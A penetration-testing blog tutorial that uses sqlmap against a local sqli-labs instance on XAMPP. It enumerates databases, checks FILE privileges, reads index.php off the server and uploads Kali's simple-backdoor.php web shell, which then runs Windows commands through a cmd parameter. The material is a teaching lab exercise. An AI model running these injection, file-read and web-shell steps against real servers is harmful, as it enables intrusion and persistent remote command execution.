<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
<div class="post-content">
            <div class="post-cats">
                <span class="cat-links"><a href="https://www.hackingarticles.in/category/database-hacking/" rel="category tag">Database Hacking</a></span>            </div>
            <h1 class="post-title entry-title">File System Access on Webserver using Sqlmap</h1>            <div class="post-date">
                                    <div class="entry-meta">
                        <span class="posted-on"><a href="https://www.hackingarticles.in/file-system-access-on-webserver-using-sqlmap/" rel="bookmark"><time class="entry-date published" datetime="2018-07-14T16:25:04+00:00">July 14, 2018</time><time class="updated" datetime="2025-05-23T10:56:08+00:00">May 23, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
                            </div>

            <div class="content post-excerpt entry-content clearfix">
                <p><span style="color: #000000;">Hello everyone and welcome to the par two of our sqlmap series. In this article, we’ll be exploiting an error based SQL injection to upload a shell on the web server and gain control over it! Now, how to do this, tools required, everything is discussed in as much detail as possible. So, let’s dive right in.</span></p>
<p><span style="color: #000000;">Since attacking a live website is a crime, we’ll be setting up a local host in a windows system using <strong>XAMPP</strong> server and we’ll use <strong>SQLi Dhakkan</strong> to create SQL vulnerabilities in a database.</span></p>
<p><span style="color: #000000;">You can download XAMPP and SQL dhakkan from <span style="color: #0000ff;"><a style="color: #0000ff;" href="https://www.apachefriends.org/download.html">here</a></span> and <span style="color: #0000ff;"><a style="color: #0000ff;" href="https://github.com/Audi-1/sqli-labs">here</a> </span>respectively.</span></p>
<p><span style="color: #000000;">Step one is to fire up the XAMPP control panel and put SQL dhakkan in <strong>C: /xampp/htdocs</strong> directory which is the default directory for the web pages. The IP address on which SQL dhakkan is hosted in my network is <strong>192.168.1.124</strong></span></p>
<p><span style="color: #000000;">So, let’s start by checking the ports open on the server using nmap.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">nmap 192.168.124</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-QoA7Q3lPo3Q/W0oghod1tOI/AAAAAAAAYE0/uSr06Qr59KkZgu705EYYys2HAsFbDxcjwCLcBGAs/s1600/0.png"/></span></p>
<p><span style="color: #000000;">As we can see that MySQL is up and running on the host so we are good to apply SQLMAP.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">sqlmap -u 192.168.1.124/sqli/Less-1/?id=1 --dbs</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-E73bhgeiFqw/W0ogh-cr4yI/AAAAAAAAYE4/ozFTTRfcabEdGgfFcGMbvA7n16phhR7XwCEwYBhgL/s1600/1.png"/></span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-wkb-CiD2dtA/W0ogi9KzOuI/AAAAAAAAYFM/MkiyGhv88REtyZbjHXHOy3kI0rlKgdfSgCEwYBhgL/s1600/2.png"/></span></p>
<p><span style="color: #000000;">Hence, we can see numerous databases loaded, so our sqlmap attack was successful.</span></p>
<h3><span style="color: #800000;">Checking privileges of the users in the database</span></h3>
<p><span style="color: #000000;">Now, to read a file it is very much important to see whether the user has FILE privileges or not. If we have file privileges we will be able to read files on the server and moreover, write the files on the server!!</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">sqlmap -u 192.168.1.124/sqli/Less-1/?id=1 --privileges</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-ajhBXPtcO5I/W0ogjCiJEjI/AAAAAAAAYF8/C_GbhZTirhwRuPHpM7bpLY2YnfbA3bfrwCEwYBhgL/s1600/2_0.png"/></span></p>
<p><span style="color: #000000;">As we can see that root@localhost has the FILE privilege.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-ykvoLQPc4Tg/W0ogjSEgcsI/AAAAAAAAYF8/fohBE5cjuwINyUt57WATmfKIdAL5w5ifwCEwYBhgL/s1600/3.png"/></span></p>
<p><span style="color: #000000;">Let’s see who the current user of this server is.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-9yRNWsElV-g/W0ogjs76-GI/AAAAAAAAYGI/nvR3ZrvBSsILyYE3D7l1DbuCOannmEpDQCEwYBhgL/s1600/4.png"/></span></p>
<p><span style="color: #000000;">As we can see that the current user has the FILE privileges so we can apply –file-read to read a file from the server and –file-write to write a file on the server!</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-tF8SdjCqdro/W0ogjjWllNI/AAAAAAAAYF4/iK2PapUnZasjcrRa-brbAyPhrQV7vcgRACEwYBhgL/s1600/4_0.png"/></span></p>
<h3><span style="color: #800000;">Reading a file from the web server</span></h3>
<p><span style="color: #000000;">Let’s try reading a file in the public directory, let’s say, index.php.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">sqlmap -u 192.168.1.124/sqli/Less-1/?id=1 --file-read=/xampp/htdocs/index.php --batch</pre>
<p><span style="color: #000000;"><strong> <img decoding="async" src="https://1.bp.blogspot.com/-L5Q1lAsKyUw/W0ogkHqMzPI/AAAAAAAAYGI/BZRKE8q4zP4m7putfQHSNcEn21AVUQBRACEwYBhgL/s1600/5.png"/></strong></span></p>
<p><span style="color: #000000;">We have read a file from a known directory successfully! We can apply directory buster to find other folders and files and read them too if we have the privileges!</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-USREuKJGPXs/W0ogkPoD9KI/AAAAAAAAYGA/SEzAfEo9c3kxbBYj-NrEuRj2spNKps0JQCEwYBhgL/s1600/5_0.png"/></span></p>
<h3><span style="color: #800000;">Uploading a shell on the web server</span></h3>
<p><span style="color: #000000;">Now, let’s try and upload a file on the web server. To do this we are using the <strong>“–file-write”</strong> command and <strong>“–file-dest”</strong> to put it in the desired destination.</span></p>
<p><span style="color: #000000;">For the sake of uploading a shell on the server, we’ll be choosing a simple command injection php shell that is already available in Kali in the <strong>/usr/share/webshells </strong>directory and has the name <strong>simple-backdoor.php</strong></span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">cd /usr/share/webshells/php
ls
cp simple-backdoor.php /root/Desktop/shell.php</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/--rBETkwmueA/W0ogkPZSJiI/AAAAAAAAYGE/iPtPuQGVUv8NlFVF1iS6icxrjyi3x_t1wCEwYBhgL/s1600/8.png"/></span></p>
<p><span style="color: #000000;">Now, we have moved the shell on the desktop. Let’s try to upload this on the web server.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">sqlmap -u 192.168.1.124/sqli/Less-1.?id=1 --file-write=/root/Desktop/shell.php --file-dest=/xampp/htdocs/shell.php --batch</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-GYV5J70oIps/W0ogkmaTWKI/AAAAAAAAYGI/eoxFzO8YxOAxjO9-4GLSPB-c7nNDS8yvACEwYBhgL/s1600/9.png"/></span></p>
<p><span style="color: #000000;">It has been uploaded successfully.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-Rxqq0vi9DyM/W0ogh2Tq_nI/AAAAAAAAYGE/Ocgp1kRi_E4fOhC7gcnwxoCVsUbU29ljwCEwYBhgL/s1600/10.png"/></span></p>
<p><span style="color: #000000;">Let’s check whether it was uploaded or not!</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-XeZiMWcRvCw/W0ogiY3ML_I/AAAAAAAAYGE/hYQb9PSnAZY6pkYFUU6MJLdGSPpZ8Z0MACEwYBhgL/s1600/11.PNG"/></span></p>
<p><span style="color: #000000;">It indeed did get uploaded. Now, we’ll try and access the shell from the browser.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">192.168.1.124/shell.php</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-37ltTIJwyK8/W0ogimtoDBI/AAAAAAAAYFw/vbvzr54f7eAh3hLZ7emcuS8hYO6GoEYrwCEwYBhgL/s1600/12.png"/></span></p>
<p> </p>
<p><span style="color: #000000;">It is a command line shell, hence, we can execute any windows command on the browser itself remotely!</span></p>
<p><span style="color: #000000;">The usage is: …..<strong>php?cmd=&lt; windows command &gt;</strong></span></p>
<p><span style="color: #000000;">Let’s try and run ipconfig on the browser</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-yrASUOF_dKQ/W0ogi5bYDbI/AAAAAAAAYF0/RVG5PzSKL_QALO2dZnFgaeSqr7Zfh3LdACEwYBhgL/s1600/13.png"/></span></p>
<p><span style="color: #000000;">Hence, we have successfully uploaded a shell and created a command injection vulnerability! Thanks for giving it a read!</span></p>
<p><span style="color: #000000;">To learn more about Database Hacking. Follow this</span> <strong><a href="https://www.hackingarticles.in/category/database-hacking/">Link.</a></strong></p>
<p><span style="color: #000000;"><strong>Author: Harshit Rajpal </strong>is an InfoSec researcher and a left and right brain thinker. contact<strong> <a style="color: #000000;" href="https://in.linkedin.com/in/harshit-rajpal-79bb43103">here</a></strong></span></p>
<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
